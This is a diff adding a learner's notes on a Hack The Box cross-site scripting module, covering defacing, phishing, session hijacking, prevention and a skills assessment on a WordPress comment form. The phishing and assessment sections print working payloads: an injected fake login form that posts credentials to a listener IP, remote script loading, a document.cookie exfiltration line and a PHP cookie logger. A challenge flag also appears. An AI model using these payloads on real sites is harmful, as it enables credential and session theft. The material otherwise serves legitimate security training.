@@ -111,14 +111,63 @@ This returned that the vulnerable parameter is email, and it is a reflected vuln
 
 ## Defacing
 
+This section covers what Defacing is and how to do it. Most hacker groups do this in order to prove that they have hacked the site and it can cause serious lack of faith in a site if it happens. In essence Defacing is just changing the outward apparence of a website to prove the site has been hacked. This usually also involves removing the exploit so as to make the change harder to fix. There are lots of ways to do this like changing the page title, background color, or what is written on the page.
+
 ## Phishing
 
+Starting off, I had serious issues with this sections problem. I got the code to work, but anytime I tried to send the url to the /phishing/send.php page it said issue sending URL. My code worked locally and I tested it sucessfully, but nothing I did worked when sending. To solve this, I had to connect to the pwnbox and redo the work there.
+
+This section covers how to created a reflected XSS webpage with a login form, and then send that URL to someone and listen on a port to steal a users credentials.
+
+The steps generally are:
+
+Create a new login form on the page that is vulnerable, for this page we found a vuln using '> which closed the img src=' element on the page. Then you can inject the javascript code. 
+
+That code looks like:
+
+`'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.104:8009><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--`
+
+Some other interesting portions of this code is it also removes the original img inserter, and the trailing <!-- is to avoid the automatically inserted '> that we already broke. Also not that I provide the PORT I will be listening on in action section of that script.
+
+We can then take the url that inserting this code gives us and send it to /phishing/send.php.
+
+This returns login credentials which can then be used on /phishing/login.php.
+
+The answer was HTB{r3f13c73d_cr3d5_84ck_2_m3} 
+
 ## Session Hijacking
+
+Once again I faced a ton of issues with the challenge on this page. I clearly had a firm grasp of what it was asking but the hack the box target and pwnbox were both having serious issues. Multiple times I opened the webpage for the target, then refreshed the page and the box died. I could not do this challenge locally no matter how I tried. And I could not get the script.js file to run when I found the blind XSS. It continued to say the script.js file did not exist despite being in the same directory as where I started the server. This is not an unknown issue based on other people in the Hack The Box forums. Overall I did not feel this section or this module was implemented well despite it being very useful training.
 
 # XSS Prevention
 
 ## XSS Prevention
 
+This section covers ways to prevent XSS. Specifically on the input validation and sanatization.We also should avoid using user input directly withing HTML tags.
+
 # Skills Assessment
 
 ## Skills Assessment
+
+This skill assessment just asks us to open a wordpress blog and find a blind XSS to take advantage of. There is a page that allows comments. When you find that page you will notice on it that an admin has to approve comments, so this is a good hint this is where our test is.
+
+There are 4 input fields, the username, comment, email and website (not sure I understand why this would be in the form but whatever). If you inspect the page source, you notice they are using single quotes in the form. So I started a php server on the PWNbox and put `'><script src=http://10.10.14.156:8080/field></script>` in each input field.
+
+The email field required a valid email, so I changed this one and tried again. Then i got a response on the server saying /website doesn't exist. That means that part of the form is vulnerable to blind XSS. So reopened the page this time input `'><script src=http://10.10.14.156:8080/script.js></script>`
+
+Then I created a script.js file on the PWNbox with `new Image().src='http://OUR_IP/index.php?c='+document.cookie;` 
+
+I also created an index.php file with:
+`<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>`
+
+Then I simply resubmitted the comment and got the answer.
